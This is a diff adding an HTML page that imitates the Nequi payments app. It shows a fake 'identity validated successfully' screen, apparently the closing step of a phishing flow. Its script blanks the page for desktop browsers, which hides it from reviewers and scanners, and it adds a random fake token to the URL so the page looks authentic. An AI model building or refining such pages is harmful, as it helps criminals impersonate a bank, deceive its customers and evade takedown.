@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Proceso Finalizado</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="mobile-container">
+        <header class="header">
+            <!-- No back button on final screen usually -->
+        </header>
+
+        <main class="content" style="justify-content: center;">
+            <div class="logo-container">
+                <h1 class="nequi-logo">Nequi<span class="dot"></span></h1>
+            </div>
+
+            <div style="text-align: center; margin-top: 20px;">
+                <div style="width: 80px; height: 80px; background-color: #00D69F; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+                    <i class="fas fa-check" style="color: white; font-size: 40px;"></i>
+                </div>
+                
+                <h2 class="page-title">¡Proceso Exitoso!</h2>
+
+                <p class="description">
+                    Hemos validado tu identidad correctamente. Ya puedes continuar disfrutando de Nequi.
+                </p>
+                
+                <p class="description" style="font-size: 13px; color: #999;">
+                    Puedes cerrar esta ventana de forma segura.
+                </p>
+            </div>
+
+            <div style="margin-top: 40px; width: 100%;">
+                <button onclick="window.close()" class="btn btn-primary">Salir</button>
+            </div>
+        </main>
+    </div>
+<script>
+    (function() {
+        // Mobile Check
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
+        if (!mobileRegex.test(userAgent)) {
+            document.body.innerHTML = '';
+        }
+
+        try {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let token = '';
+            for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
+                token += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const base64Token = btoa(token + Date.now()).replace(/=/g, '');
+            const url = new URL(window.location.href);
+            url.searchParams.set('token', base64Token);
+            window.history.replaceState(null, '', url.toString());
+        } catch(e) {}
+    })();
+</script>
+</body>
+</html>
